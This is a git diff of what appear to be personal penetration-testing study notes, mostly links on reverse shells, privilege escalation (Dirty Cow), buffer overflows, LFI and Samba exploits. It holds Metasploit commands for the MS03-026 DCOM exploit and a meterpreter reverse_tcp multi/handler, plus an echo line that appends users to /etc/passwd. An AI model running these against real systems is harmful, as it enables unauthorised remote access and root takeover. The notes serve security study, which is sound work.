@@ -19,6 +19,7 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (for getti
 https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 # Privilege Escalation 
+1. 
 
 http://www.fuzzysecurity.com/tutorials/16.html
 
@@ -30,6 +31,13 @@ http://www.fuzzysecurity.com/tutorials/16.html
   
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
  
+ 
+2. Linux Kernel 2.6.22 < 3.9 --> Dirty Cow
+  
+https://www.exploit-db.com/exploits/40839/
+
+https://www.youtube.com/watch?v=iyhbLeOzegM
+
 # Buffer Overflow 
 
 Q) What is buffer-overflow
@@ -47,6 +55,9 @@ https://www.youtube.com/watch?v=Pi51KlEulj4
 https://hashkiller.co.uk/md5-decrypter.aspx
 
 # For RPC Service 
+
+> use exploit/windows/dcerpc/ms03_026_dcom
+
 https://null-byte.wonderhowto.com/how-to/hack-like-pro-exploit-and-gain-remote-access-pcs-running-windows-xp-0134709/
 
 # Extra Toppings
@@ -55,19 +66,19 @@ https://pinboard.in/u:unfo/t:oscp
 
 # LFI _ Practise 
 
-1. Coldfusion >>
+1. Coldfusion 
 
 http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/
 
 https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
 
 # Using Multihandler
-msf>use exploit multi/handler
-msf>set payload windows/meterpreter/reverse_tcp
-msf>set lhost <local IP>
-msf>set lport <local port>
-msf> set ExitOnSession false
-msf>exploit -j
+1. msf>use exploit multi/handler
+2. msf>set payload windows/meterpreter/reverse_tcp
+3. msf>set lhost <local IP>
+4. msf>set lport <local port>
+5. msf> set ExitOnSession false
+6. msf>exploit -j
 
 # append users in /etc/passwd
 
@@ -78,12 +89,6 @@ echo "line:to:add" >> /etc/passwd
 https://netsec.ws/?p=331
 
 http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
-
-# Privilege Escalation
-  1. Linux Kernel 2.6.22 < 3.9 --> Dirty Cow
-  
-https://www.exploit-db.com/exploits/40839/
-https://www.youtube.com/watch?v=iyhbLeOzegM
 
 # OpenFuck / NT SNT Samba Server / Trans2open
 
@@ -107,17 +112,5 @@ https://www.exploit-db.com/exploits/16809/
 
 
 To be Cont.......
-
-
-
-
-
-
-
-
-
-
-  
-  > use exploit/windows/dcerpc/ms03_026_dcom
   
 
